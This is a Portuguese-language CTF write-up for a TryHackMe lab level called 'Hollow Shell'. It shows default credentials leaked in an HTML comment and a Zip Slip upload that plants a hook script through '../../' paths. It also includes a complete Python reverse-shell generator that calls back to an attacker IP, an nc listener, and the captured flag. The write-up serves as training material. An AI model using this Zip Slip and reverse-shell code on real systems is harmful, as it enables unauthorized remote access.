# TryHackMe — Hackers Holiday CTF
## Level 10 — Hollow Shell

**Categoria:** Web Exploitation / Arbitrary File Write (Zip Slip) / Remote Code Execution
**Dificuldade:** Difícil

---

### 🛎️ Concierge Briefing

> You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.
> The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own.

---

## 🎯 Objetivo

O briefing brinca com a palavra **"shell"** em dois sentidos: uma concha de praia (souvenir) e uma **shell de sistema**. O portal **"Shoreline Display"** permite que a equipe do hotel publique "shells" (`.zip`) para personalizar os displays dos quartos. A frase-chave é *"slip past what the portal forgets to check"* — uma dica direta de que existe uma **validação ausente** no processo de upload/extração desses arquivos `.zip`, explorável para conseguir execução remota de comandos.

---

## 🔍 Passo 1 — Encontrando credenciais padrão no código-fonte

Acessando o portal de login em `http://10.64.128.204:5000/login`:

![Tela de login "Byte Lotus — Shoreline Display" (Staff sign-in)](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Login_Page.png)

Inspecionando o **código-fonte** da página (`view-source:`), um comentário HTML deixado pela equipe de TI chama atenção:

![Comentário HTML revelando credenciais padrão de staff](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Source_Code.png)

```html
<!--
  Byte Lotus // internal display-manager portal
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
      user: concierge
      pass: StayNoticed2024!
  (rotate it from Settings on first sign-in — most people forget)
-->
```

Uma credencial padrão (`concierge` / `StayNoticed2024!`), pensada para ser trocada no primeiro login — mas, como o próprio comentário admite, **"most people forget"**. Usando essas credenciais, o login no portal é bem-sucedido.

---

## 🔍 Passo 2 — Entendendo a funcionalidade de upload de "shells"

Já autenticado, o portal **Room Service / Shoreline Display** expõe uma funcionalidade de upload de arquivos `.zip` ("shells"):

![Portal Shoreline Display: funcionalidade de upload de shells (.zip) e lista de shells publicados](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Shell_Upload.png)

> *"Found something on the beach? Upload it as a shell (a .zip souvenir pack) to set the ambiance on the in-room tablets. Each shell must contain a shell.json manifest listing its assets (images, stylesheets)."*
>
> *"A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand. Allowed asset types: png jpg gif svg css json."*

Dois pontos centrais aqui:

1. Cada "shell" enviado é um `.zip` contendo, no mínimo, um **`shell.json`** — um manifesto listando os assets do pacote.
2. O manifesto pode incluir **"automation hooks"**, que são aplicados automaticamente por um **"theme worker"** logo depois que o shell é recebido — ou seja, **código é executado no servidor** com base em algo declarado dentro do próprio `.zip` enviado pelo usuário.

Essa combinação — um manifesto controlado pelo atacante + hooks que disparam execução automática + extração de arquivos de um `.zip` — é a receita clássica para uma vulnerabilidade de **Zip Slip** (escrita arbitrária de arquivos através de caminhos maliciosos dentro de um `.zip`) combinada com **RCE via hook de automação**.

---

## 🔍 Passo 3 — Construindo o "shell" malicioso

A hipótese: se o processo de extração do `.zip` não sanitizar os nomes dos arquivos internos, é possível usar caminhos como `../../hooks/callback.py` para **escapar da pasta de destino do shell** e escrever um arquivo diretamente na pasta compartilhada `hooks/`, de onde o `post_install` hook declarado no manifesto é executado.

Um script Python foi escrito para montar esse pacote `.zip` malicioso:

![Script Python construindo o shell.json malicioso com hook de post_install e path traversal no callback.py](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Code_Python.png)

```python
import zipfile
import json

ATTACKER_IP = "192.168.157.47"
PORT = 4444

manifest = {
    "name": "reverse_shell",
    "version": "1.0",
    "assets": [],
    "hooks": {
        "post_install": "python3 hooks/callback.py"
    }
}

callback = f'''#!/usr/bin/env python3
import socket, os, pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ATTACKER_IP}", {PORT}))

# Duplica o socket para stdin, stdout, stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn do shell interativo
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("a.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest, indent=2))
    z.writestr("../../hooks/callback.py", callback)
```

O truque está nas duas entradas do `.zip`:

- **`shell.json`** → o manifesto "legítimo", declarando um hook `post_install` que executa `python3 hooks/callback.py` — um caminho **relativo**, que será resolvido a partir do diretório de trabalho da aplicação (não do diretório do próprio shell extraído).
- **`../../hooks/callback.py`** → o nome do arquivo dentro do `.zip` contém sequências `../../`, escapando da pasta onde o shell individual seria extraído (`shells/<id>/`) e **sobrescrevendo/criando o arquivo real `hooks/callback.py`** compartilhado por toda a aplicação — exatamente o script que o hook `post_install` do manifesto espera encontrar e executar.

Ou seja: o `.zip` "planta" o próprio payload malicioso no local exato de onde o "theme worker" da aplicação vai executá-lo automaticamente, assim que o hook for processado.

---

## 🔍 Passo 4 — Enviando o shell e capturando a shell reversa

Com o listener pronto:

```bash
nc -lnvp 4444
```

O arquivo `a.zip` foi enviado através do formulário **"Bring a shell ashore"**, clicando em **"HOLD IT TO THE ROOM'S EAR"**:

![Shell "reverse_shell" enviado e listado entre os shells publicados no portal](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Shell_Upload.png)

A aplicação confirma o upload:

> *"Shell 'reverse_shell' brought ashore. Stored at shells/9692be695086/ and held to the room's ear."*

Pouco depois, o **"theme worker"** processa o `post_install` do manifesto — executando `python3 hooks/callback.py`, que agora corresponde ao payload plantado via *Zip Slip*. O listener recebe a conexão:

![Conexão da shell reversa recebida no listener](/Hacker%20Holiday%202026%20-%20THM/10º%20Level%20-%20The%20Hollow%20Shell/images/Flag.png)

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.67.170.43] 42264
roomservice@tryhackme-2404:/var/www/conch$
```

Shell interativa obtida como o usuário **`roomservice`**, dentro do diretório da própria aplicação (`/var/www/conch`), confirmando a estrutura descrita no portal (`app.py`, `hooks/`, `shells/`, `static/`, `templates/`, `theme_worker.py`).

---

## 🔍 Passo 5 — Capturando a flag

```bash
ls /home
```
```
roomservice  ubuntu
```

```bash
cat /home/roomservice/flag.txt
```

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

Um trocadilho perfeito com a técnica usada: um **zip** que **"escorregou" (slipped)** para dentro de uma **shell**.

---

## 🚩 Flag

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → um portal de upload de "shells" (`.zip`) para personalizar displays de quarto; a dica aponta para uma validação ausente no processamento desses arquivos.
2. **Código-fonte da página de login** → expõe, em um comentário HTML, as credenciais padrão de staff (`concierge` / `StayNoticed2024!`) que nunca foram trocadas.
3. **Login no portal Shoreline Display** → revela a funcionalidade de upload de "shells" com **manifesto (`shell.json`)** e **hooks de automação (`post_install`)** processados por um "theme worker".
4. **Construção do `.zip` malicioso** → um manifesto declarando `post_install: python3 hooks/callback.py`, combinado com uma entrada de arquivo cujo nome contém `../../` (**Zip Slip**), escrevendo o payload diretamente na pasta `hooks/` compartilhada pela aplicação.
5. **Upload do shell malicioso** → o "theme worker" executa automaticamente o hook declarado, que agora aponta para o payload plantado.
6. **Reverse shell recebida** como o usuário `roomservice`.
7. **Leitura de `/home/roomservice/flag.txt`** → flag capturada.

---